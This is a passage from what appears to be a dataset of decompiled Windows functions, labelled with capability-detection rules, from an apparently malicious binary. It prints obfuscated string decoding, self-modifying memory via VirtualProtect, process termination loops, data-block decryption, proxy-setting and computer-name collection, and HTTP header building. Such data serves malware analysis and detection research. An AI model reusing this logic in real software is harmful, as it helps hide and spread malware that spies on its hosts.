* 4 + 0x427860) = 0;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(200);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar3, 0);\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(iVar8, &stack0xfffffd90);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if ((iVar6 != 0) && (iVar5 == 0x103)) {\n            uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00402bb2, arg_8h, 0, 0);\n            (*pcVar2)(uVar7);\n        }\n        (*pcVar2)(iVar3);\n        (*pcVar2)(iVar8);\n    } while( true );\n}\n",
        "token_count": 1157
    },
    "00402d3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00402d3c(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint noname_4, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_310h;\n    uint var_108h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n    puVar6 = &var_108h;\n    for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    puVar6 = &var_310h;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if ((*0x4279d8 != 0) && (arg_ch == 0x74fc6984)) {\n        *0x42764c = 1;\n        iVar5 = fcn.00401f77();\n        if (iVar5 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            *(iVar5 + 8) = arg_10h;\n            uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00402bb2, iVar5, 0, 0);\n            (*pcVar2)(uVar3);\n        }\n    }\n    uVar4 = 0;\n    if (arg_1ch != 1) {\n        do {\n            if (*(uVar4 + 0x415b60) == arg_ch) {\n                if (arg_10h == *0x4279e0) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar6 = &var_108h;\n                    for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar6 = 0;\n                        puVar6 = puVar6 + 1;\n                    }\n                    var_108h._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar5 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar5 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar5, &var_108h, 0x104);\n                        (*pcVar2)(iVar5);\n                    }\n                    pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_108h);\n                    if (iVar5 != 0) {\n                        (*pcVar1)(&var_108h);\n                        fcn.0040a465();\n                    }\n                }\n                iVar5 = fcn.00401fd2();\n                if (iVar5 != 0) {\n                    return 1;\n                }\n                puVar6 = &var_310h;\n                for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                iVar5 = fcn.0040191e();\n                if (iVar5 == 0) {\n                    return 1;\n                }\n                if ((*0x4279d8 == 0) && (iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_310h, 0x427650),  iVar5 != 0)) {\n                    return 1;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040216e, arg_10h, 0, 0);\n                (*pcVar2)(uVar3);\n                return 1;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x1c);\n    }\n    return 1;\n}\n",
        "token_count": 1007
    },
    "004030b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004030b6(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    int32_t *piVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_30h = 0x4e043539;\n    var_2ch = 0x70787503;\n    var_28h = 0x3524563f;\n    var_24h = 0x75014e47;\n    var_20h = 0x5616705c;\n    var_1ch._0_2_ = 0x3575;\n    var_10h = 0x4e703575;\n    var_ch._0_1_ = 0x56;\n    fcn.00403802();\n    iVar11 = 0;\n    var_8h = &var_30h - var_14h;\n    do {\n        pcVar1 = var_14h + iVar11;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_10h + iVar11 % 5);\n        uVar3 = pcVar1[var_8h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar11 = iVar11 + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n    } while (iVar11 < 0x16);\n    if ((*0x4279d8 == 0) && (*arg_8h == 0x20)) {\n        puVar12 = 0x427650;\n        for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar12 = 0;\n            puVar12 = puVar12 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.0040191e();\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        piVar9[1] = arg_8h[3];\n        *piVar9 = arg_8h[2];\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        piVar9[2] = iVar11;\n        uVar8 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00402bb2, piVar9, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n    }\n    uVar10 = 0;\n    do {\n        *(uVar10 + 0x418010) = *(uVar10 + 0x418010) ^ *((uVar10 & 0xf) + 0x41de10);\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x5e00);\n    uVar10 = 0;\n    do {\n        *(uVar10 + 0x41de20) = *(uVar10 + 0x41de20) ^ *(uVar10 % 10 + 0x425e20);\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x8000);\n    uVar10 = 0;\n    do {\n        if (*(uVar10 + 0x418010) == 0x11223344) {\n            *(uVar10 + 0x418010) = 0x12;\n        }\n        else if (*(uVar10 + 0x418010) == 0x55667788) {\n            *(uVar10 + 0x418010) = 0x13;\n        }\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x5e00);\n    uVar10 = 0;\n    do {\n        if (*(uVar10 + 0x41de20) == 0x11223344) {\n            *(uVar10 + 0x41de20) = 0x12;\n        }\n        else if (*(uVar10 + 0x41de20) == 0x55667788) {\n            *(uVar10 + 0x41de20) = 0x13;\n        }\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x8000);\n    uVar8 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00402ecf, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n    pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n    if (*0x4279d8 != 0) {\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        *(iVar11 + 8) = uVar8;\n        uVar8 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00402bb2, iVar11, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n        pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n    }\n    while (pcVar5 = _sym.imp.KERNEL32.dll_Sleep,  _sym.imp.KERNEL32.dll_Sleep = pcVar4,  *0x427bb4 == 0) {\n        fcn.0040d8ef();\n        if (*0x4279d8 != 0) {\n            (*pcVar5)(1000);\n        }\n        (*pcVar5)(0x1e);\n        pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n        _sym.imp.KERNEL32.dll_Sleep = pcVar5;\n    }\n    fcn.004037dd();\n    return 0;\n}\n",
        "token_count": 1507
    },
    "004032e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004032e9(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint noname_0;\n    uint *puVar10;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_40h = 0x4e043539;\n    var_3ch = 0x70787503;\n    puVar10 = &var_18h;\n    for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_38h = 0x3524563f;\n    puVar10 = &var_28h;\n    for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_34h = 0x75014e47;\n    var_30h = 0x5616705c;\n    var_2ch._0_2_ = 0x3575;\n    var_10h = 0x4e703575;\n    var_ch._0_1_ = 0x56;\n    fcn.00403802(0);\n    iVar9 = 0;\n    var_8h = &var_40h - var_1ch;\n    do {\n        pcVar1 = var_1ch + iVar9;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_10h + iVar9 % 5);\n        uVar3 = pcVar1[var_8h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar9 = iVar9 + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        pcVar4 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    } while (iVar9 < 0x16);\n    iVar9 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.OG_vAY__, 0x184, 0x40, &var_4h);\n    if (iVar9 != 0) {\n        fcn.00410082();\n        (*pcVar4)(str.OG_vAY__, 0x184, var_4h, &var_4h);\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040a614();\n    iVar9 = fcn.0040d287();\n    if (iVar9 != 0) {\n        if (2 < var_44h._1_1_) {\n            iVar9 = 0;\n            if (0 < var_44h._1_1_ - 2) {\n                do {\n                    *0x427964 = *0x427964 + (&var_38h)[iVar9];\n                    iVar9 = iVar9 + 1;\n                } while (iVar9 < var_44h._1_1_ - 2);\n            }\n        }\n        *0x427964 = *0x427964 ^ 0x3dd5193;\n        fcn.00406dcb();\n    }\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    puVar10 = puVar8;\n    for (iVar9 = 0x10; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar8 = 0x20;\n    puVar8[1] = 1;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00401322, puVar8, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n    pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n    do {\n        cVar5 = fcn.0040fcdb();\n        if (cVar5 != '\\0') {\n            iVar9 = fcn.00401178(0);\n            if (iVar9 != 0) {\n                var_10h = 0;\n                var_8h = 0;\n                fcn.0041016b();\n                (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(var_1ch);\n                fcn.004039de(noname_0, &var_10h, &var_8h);\n                (*pcVar4)(0xffffffff);\n            }\n            fcn.0041016b();\n        }\n        (*pcVar4)(500);\n    } while( true );\n}\n",
        "token_count": 1237
    },
    "00403c68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403c68(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t in_EDX;\n    code *pcVar12;\n    char *pcVar13;\n    uint *puVar14;\n    int32_t iVar15;\n    uint lpVersionInformation;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a4h;\n    ushort var_a4h;\n    ushort var_a2h;\n    uint var_a0h;\n    uint var_98h;\n    int32_t nSize;\n    uint var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t ARG_1;\n    uint var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    int32_t hKey;\n    int32_t var_70h;\n    int32_t lpString;\n    int32_t var_68h;\n    code *var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    ushort var_42h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    puVar14 = &lpVersionInformation;\n    var_68h = in_EDX;\n    for (iVar10 = 0x11c; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    var_64h = _sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders;\n    if (in_EDX != 0) {\n        var_64h = _sym.imp.WININET.dll_HttpAddRequestHeadersW;\n    }\n    lpVersionInformation = 0x11c;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x410);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpString = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    if (lpString != 0) {\n        var_2ch._0_1_ = 0xb;\n        var_2ch._1_1_ = 0x78;\n        var_2ch._2_1_ = 0x79;\n        var_2ch._3_1_ = 0x58;\n        var_28h = 0x783a4f15;\n        var_24h = 0x4f365838;\n        var_20h._0_1_ = 0x7e;\n        var_20h._1_1_ = 0x78;\n        var_20h._2_2_ = 0x581a;\n        var_1ch._0_1_ = 0x32;\n        var_1ch._1_1_ = 0x4f;\n        var_1ch._2_2_ = 0x783e;\n        var_18h._0_1_ = 0x31;\n        var_18h._1_1_ = 0x58;\n        var_18h._2_1_ = 0x69;\n        var_18h._3_1_ = 0x4f;\n        var_14h = 0x58717873;\n        var_10h._0_1_ = 0x20;\n        var_10h._1_2_ = 0x534f;\n        var_10h._3_1_ = 0x78;\n        var_8h._0_2_ = 0x7853;\n        var_8h._2_1_ = 0x54;\n        var_8h._3_1_ = 0x58;\n        var_4h._0_1_ = 0x53;\n        var_4h._1_1_ = 0x4f;\n        uVar8 = (*pcVar12)(8, 0x41);\n        iVar10 = (*pcVar3)(uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) + -0x16;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x41);\n        var_88h = iVar10;\n        sub.ntdll.dll_memset(iVar10, 0, 0x41);\n        iVar15 = 0;\n        var_5ch = &var_2ch - iVar10;\n        do {\n            pcVar13 = iVar10 + iVar15;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar1 = *(&var_8h + iVar15 % 6);\n            uVar2 = pcVar13[var_5ch];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar4 = lpString;\n            iVar15 = iVar15 + 1;\n            *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n            iVar10 = var_88h;\n        } while (iVar15 < 0x20);\n        (*_sym.imp.USER32.dll_wsprintfW)(lpString, var_88h, *0x4279dc);\n        uVar9 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar4, 0x10000000);\n        uVar8 = var_60h;\n        pcVar12 = var_64h;\n        (*var_64h)(var_60h, iVar4, uVar9);\n        iVar10 = fcn.00403b06();\n        if (iVar10 != 0) {\n            uVar9 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar4, 0x10000000);\n            (*pcVar12)(uVar8, iVar4, uVar9);\n        }\n        hKey = 0;\n        var_5ch = 0;\n        iVar10 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                           (0x80000001, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\", 0, 0x20019, \n                            &hKey);\n        pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar10 == 0) {\n            fcn.0040db00(&var_5ch);\n            fcn.0040db00(&var_8ch);\n            fcn.0040db00(&var_7ch);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            var_30h._0_2_ = 0x7529;\n            var_30h._2_2_ = 0x3147;\n            var_2ch._0_1_ = 0x1e;\n            var_2ch._1_1_ = 0x4b;\n            var_2ch._2_1_ = 3;\n            var_2ch._3_1_ = 0x75;\n            var_28h = 0x4b363105;\n            var_24h = 0x31477508;\n            var_20h._0_1_ = 0x1d;\n            var_20h._1_1_ = 0x4b;\n            var_20h._2_2_ = 0x7514;\n            var_1ch._0_1_ = 0x18;\n            var_1ch._1_1_ = 0x31;\n            var_1ch._2_2_ = 0x4b38;\n            var_18h._0_1_ = 0x14;\n            var_18h._1_1_ = 0x75;\n            var_18h._2_1_ = 0x18;\n            var_18h._3_1_ = 0x31;\n            var_14h = 0x75514b74;\n            var_10h._0_1_ = 0x4f;\n            var_10h._1_2_ = 0x3d31;\n            var_10h._3_1_ = 0x4b;\n            var_ch._0_1_ = 0x71;\n            var_ch._1_1_ = 0x75;\n            var_8h._0_2_ = 0x7571;\n            var_8h._2_1_ = 0x6a;\n            var_8h._3_1_ = 0x31;\n            var_4h._0_1_ = 0x4e;\n            var_4h._1_1_ = 0x4b;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n            iVar10 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n            uVar11 = 0;\n            do {\n                *(iVar10 + uVar11) = *(iVar10 + uVar11) + -0x4b;\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x4d);\n            ARG_1 = iVar10;\n            sub.ntdll.dll_memset(iVar10, 0, 0x4d);\n            var_70h = 0;\n            iVar15 = iVar10;\n            do {\n                iVar4 = var_70h;\n                pcVar13 = iVar15 + var_70h;\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar1 = *(&var_8h + iVar4 % 6);\n                uVar2 = pcVar13[&var_30h - iVar10];\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_70h = var_70h + 1;\n                *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n                iVar15 = ARG_1;\n            } while (var_70h < 0x26);\n            var_34h._0_1_ = 0xf;\n            var_34h._1_1_ = 0x72;\n            var_34h._2_2_ = 0x631e;\n            var_30h._0_2_ = 0x6a03;\n            var_30h._2_2_ = 0x7225;\n            var_2ch._0_1_ = 0x5c;\n            var_2ch._1_1_ = 99;\n            var_2ch._2_1_ = 0x2b;\n            var_2ch._3_1_ = 0x6a;\n            var_28h = 0x631e722e;\n            var_24h = 0x72216a1c;\n            var_20h._0_1_ = 0x56;\n            var_20h._1_1_ = 99;\n            var_20h._2_2_ = 0x6a21;\n            var_1ch._0_1_ = 0x25;\n            var_1ch._1_1_ = 0x72;\n            var_1ch._2_2_ = 0x635a;\n            var_18h._0_1_ = 0x37;\n            var_18h._1_1_ = 0x6a;\n            var_18h._2_1_ = 0x32;\n            var_18h._3_1_ = 0x72;\n            var_14h = 0x6a736309;\n            var_10h._0_1_ = 0x72;\n            var_10h._1_2_ = 0x4072;\n            var_10h._3_1_ = 99;\n            var_ch._0_1_ = 0x53;\n            var_ch._1_1_ = 0x6a;\n            var_8h._0_2_ = 0x7257;\n            var_8h._2_1_ = 0x33;\n            var_8h._3_1_ = 99;\n            var_4h._0_1_ = 0x53;\n            var_4h._1_1_ = 0x6a;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x55);\n            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            uVar11 = 0;\n            do {\n                *(iVar10 + uVar11) = *(iVar10 + uVar11) + 't';\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x55);\n            hKey = iVar10;\n            sub.ntdll.dll_memset(iVar10, 0, 0x55);\n            var_70h = 0;\n            iVar15 = iVar10;\n            do {\n                iVar4 = var_70h;\n                pcVar13 = iVar15 + var_70h;\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar1 = *(&var_8h + iVar4 % 6);\n                uVar2 = pcVar13[&var_34h - iVar10];\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_70h = var_70h + 1;\n                *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n                iVar15 = hKey;\n            } while (var_70h < 0x2a);\n            var_38h = 0x455f7600;\n            var_34h._0_1_ = 0x37;\n            var_34h._1_1_ = 0x58;\n            var_34h._2_2_ = 0x7204;\n            var_30h._0_2_ = 0x672a;\n            var_30h._2_2_ = 0x7620;\n            var_2ch._0_1_ = 0xb;\n            var_2ch._1_1_ = 0x45;\n            var_2ch._2_1_ = 0x4a;\n            var_2ch._3_1_ = 0x58;\n            var_28h = 0x672a7235;\n            var_24h = 0x45147636;\n            var_20h._0_1_ = 0xe;\n            var_20h._1_1_ = 0x58;\n            var_20h._2_2_ = 0x7211;\n            var_1ch._0_1_ = 0x10;\n            var_1ch._1_1_ = 0x67;\n            var_1ch._2_2_ = 0x762a;\n            var_18h._0_1_ = 0x1e;\n            var_18h._1_1_ = 0x45;\n            var_18h._2_1_ = 0x5d;\n            var_18h._3_1_ = 0x58;\n            var_14h = 0x67607256;\n            var_10h._0_1_ = 0x2b;\n            var_10h._1_2_ = 0x7276;\n            var_10h._3_1_ = 0x45;\n            var_8h._0_2_ = 0x7658;\n            var_8h._2_1_ = 0x72;\n            var_8h._3_1_ = 0x45;\n            var_4h._0_1_ = 0x67;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x59);\n            iVar10 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n            uVar11 = 0;\n            do {\n                *(iVar10 + uVar11) = *(iVar10 + uVar11) + '8';\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x59);\n            var_70h = iVar10;\n            sub.ntdll.dll_memset(iVar10, 0, 0x59);\n            var_78h = 0;\n            iVar15 = iVar10;\n            do {\n                iVar4 = var_78h;\n                pcVar13 = iVar15 + var_78h;\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar1 = *(&var_8h + iVar4 % 5);\n                uVar2 = pcVar13[&var_38h - iVar10];\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iVar5 = var_5ch;\n                iVar4 = lpString;\n                var_78h = var_78h + 1;\n                *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n                iVar15 = var_70h;\n            } while (var_78h < 0x2c);\n            if (var_5ch != 0) {\n                (*_sym.imp.USER32.dll_wsprintfW)(lpString, ARG_1, var_5ch);\n                uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar4, 0x10000000);\n                (*var_64h)(var_60h, iVar4, uVar8);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            }\n            iVar15 = hKey;\n            iVar10 = var_8ch;\n            if (var_8ch != 0) {\n                (*_sym.imp.USER32.dll_wsprintfW)(iVar4, hKey, var_8ch);\n                uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar4, 0x10000000);\n                (*var_64h)(var_60h, iVar4, uVar8);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            }\n            iVar4 = var_70h;\n            iVar10 = var_7ch;\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (var_7ch != 0) {\n                (*_sym.imp.USER32.dll_wsprintfW)(lpString, var_70h, var_7ch);\n                uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n                (*var_64h)(var_60h, lpString, uVar8);\n                pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            }\n            uVar11 = 0;\n            do {\n                pcVar13 = iVar4 + uVar11;\n                *pcVar13 = *pcVar13 + -0x3f;\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x59);\n            uVar8 = (*pcVar12)(0, iVar4);\n            pcVar3 = _sym.imp.ntdll.dll_RtlFreeHeap;\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n            uVar11 = 0;\n            do {\n                pcVar13 = iVar15 + uVar11;\n                *pcVar13 = *pcVar13 + -0x70;\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x55);\n            uVar8 = (*pcVar12)(0, iVar15);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            uVar11 = 0;\n            do {\n                *(ARG_1 + uVar11) = *(ARG_1 + uVar11) + -0x65;\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x4d);\n            uVar8 = (*pcVar12)(0, ARG_1);\n            (*pcVar3)(uVar8);\n        }\n        uVar8 = (*pcVar12)(8, 0x208);\n        var_78h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        nSize = 0x104;\n        if (var_78h != 0) {\n            iVar15 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(var_78h, &nSize);\n            iVar10 = var_78h;\n            if (iVar15 != 0) {\n                var_30h._0_2_ = 0x6d6a;\n                var_30h._2_2_ = 0x7a15;\n                var_2ch._0_1_ = 0x11;\n                var_2ch._1_1_ = 0x37;\n                var_2ch._2_1_ = 0x5d;\n                var_2ch._3_1_ = 0x6d;\n                var_28h = 0x37227a55;\n                var_24h = 0x7a4c6d47;\n                var_20h._0_1_ = 0x37;\n                var_20h._1_1_ = 0x37;\n                var_20h._2_2_ = 0x6d40;\n                var_1ch._0_1_ = 0x76;\n                var_1ch._1_1_ = 0x7a;\n                var_1ch._2_2_ = 0x3733;\n                var_18h._0_1_ = 0x5f;\n                var_18h._1_1_ = 0x6d;\n                var_18h._2_1_ = 0x5d;\n                var_18h._3_1_ = 0x7a;\n                var_14h = 0x6d123768;\n                var_10h._0_1_ = 0x1d;\n                var_10h._1_2_ = 0x217a;\n                var_10h._3_1_ = 0x37;\n                var_ch._0_1_ = 0x32;\n                var_ch._1_1_ = 0x6d;\n                var_8h._0_2_ = 0x6d32;\n                var_8h._2_1_ = 0x38;\n                var_8h._3_1_ = 0x7a;\n                var_4h._0_1_ = 0x52;\n                var_4h._1_1_ = 0x37;\n                uVar8 = (*pcVar12)(8, 0x4d);\n                iVar15 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n                uVar11 = 0;\n                do {\n                    *(iVar15 + uVar11) = *(iVar15 + uVar11) * -0x52;\n                    uVar11 = uVar11 + 1;\n                } while (uVar11 < 0x4d);\n      